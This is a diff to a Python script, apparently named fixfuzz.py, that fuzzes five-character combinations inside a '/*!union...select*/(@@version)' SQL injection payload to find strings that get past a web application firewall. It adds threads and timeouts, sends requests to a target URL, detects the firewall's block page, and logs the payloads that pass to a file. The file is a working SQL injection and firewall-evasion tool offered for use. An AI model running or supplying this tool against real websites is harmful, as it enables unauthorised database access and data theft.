@@ -12,10 +12,12 @@ import random
 import threading
 import time
 
-stop_now = False
-class running:
+tested = []
+num = 0
+
+class threadclass(threading.Thread):
     def __init__(self,url,proxies,db):
-        self.num =  1
+        threading.Thread.__init__(self)
         self.url = url
         self.proxies = proxies
         self.db = db
@@ -48,18 +50,17 @@ class running:
         self.FUZZ_mssql = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '0A', '0B', '0C', '0D', '0E', '0F', '10',
                       '11', '12', '13', '14', '15', '16', '17', '18', '19', '1A', '1B', '1C', '1D', '1E', '1F', '20',
                       '25']
-    def data(self):
+    def run(self):
+        global num
         lock = threading.RLock()
         targetdb = 'self.FUZZ_'+self.db
         FUZZ = self.FUZZ_qwe+self.FUZZ_ewq+eval(targetdb)
-        tested = []
         for a in FUZZ:
             for b in FUZZ:
                 for c in FUZZ:
                     for d in FUZZ:
                         for e in FUZZ:
                             lock.acquire()
-                            self.num += 1
                             fix = a+b+c+d+e
                             if fix in tested:
                                 pass
@@ -68,8 +69,12 @@ class running:
                                 payload = '/*!union'+fix+'select*/(@@version)'
                                 url_test = self.url+payload
                                 header = {'User-Agent': random.choice(self.headers)}
-                                res = requests.get(url=url_test,headers=header)
-                                status = res.status_code
+                                try:
+                                    res = requests.get(url=url_test,headers=header,timeout=5)
+                                    status = res.status_code
+                                except Exception:
+                                    print(url_test+' requests failed')
+                                    print(header)
                                 with open('results.txt','a+') as file:
                                     if '网站防火墙' in res.text:
                                         print(url_test+'\033[0;31;40m is bad\033[0m')
@@ -78,8 +83,9 @@ class running:
                                         file.write(url_test)
                                     else:
                                         print(url_test+' \033[0;33;40mnot a value select\033[0m')
-                            sys.stdout.write('\r进度：%s/%s' %(self.num,len(FUZZ)**5))
-                            sys.stdout.flush()
+                                num += 1
+                                sys.stdout.write('\r进度：%s/%s    ' %(num,len(FUZZ)**5))
+                                sys.stdout.flush()
                             lock.release()
 
 def usage():
@@ -92,6 +98,7 @@ def usage():
     print(' -h |--help Shows this help\n')
     print('Eg. ./fixfuzz.py -u http://127.0.0.1/news/list.php?id=11 -d mysql -r 256 -p http://127.0.0.1:1080\n')
 def main(argv):
+    num = 1
     proxies = False
     threads = 16
     try:
@@ -114,10 +121,9 @@ def main(argv):
     if url == '' or db == '' or int(threads) > 16:
         usage()
         sys.exit(-1)
-    threadsl = running(url,proxies,db)
     threadlist = []
     for i in range(int(threads)):
-        t = threadsl.data()
+        t = threadclass(url,proxies,db)
         threadlist.append(t)
         t.start()
     while len(threadlist) > 0:
